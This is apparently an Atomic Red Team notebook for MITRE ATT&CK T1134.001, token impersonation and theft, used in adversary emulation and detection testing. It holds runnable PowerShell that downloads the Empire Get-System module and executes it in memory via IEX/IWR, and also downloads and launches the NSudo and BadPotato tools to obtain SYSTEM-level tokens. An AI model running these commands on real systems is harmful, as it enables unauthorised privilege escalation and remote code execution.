{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9fa00b1c",
   "metadata": {},
   "source": "# T1134.001 - Token Impersonation/Theft\nAdversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system."
  },
  {
   "cell_type": "markdown",
   "id": "12a0ca03",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1b6f63eb",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Named pipe client impersonation",
    "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78f82484",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a94a752a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - `SeDebugPrivilege` token duplication",
    "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c210a74",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "878865bc",
   "metadata": {},
   "source": "### Atomic Test #3 - Launch NSudo Executable\nLaunches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: NSudo.bat must exist in the specified path #{nsudo_path}\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest -OutFile $env:TEMP\\NSudo_8.2_All_Components.zip \"https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip\"\nExpand-Archive -Path $env:TEMP\\NSudo_8.2_All_Components.zip -DestinationPath $env:TEMP\\NSudo_8.2_All_Components -Force\nRename-Item \"$env:TEMP\\NSudo_8.2_All_Components\\NSudo Launcher\" $env:TEMP\\NSudo_8.2_All_Components\\NSudo_Launcher\nRemove-Item $env:TEMP\\NSudo_8.2_All_Components.zip -Recurse -ErrorAction Ignore\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ab6bb17",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b7f2b2a8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process $env:TEMP\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc6a0722",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "de54ba06",
   "metadata": {},
   "source": "### Atomic Test #4 - Bad Potato\nhttps://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: BadPotato.exe must exist in the temp directory\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\BadPotato.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest -OutFile $env:TEMP\\BadPotato.exe \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf903b90",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6a8e082f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd $env:temp\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7e3e950",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "f0dda07c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntaskkill /f /im notepad.exe\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5541fa0b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4b0d1de0",
   "metadata": {},
   "source": "## Detection\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}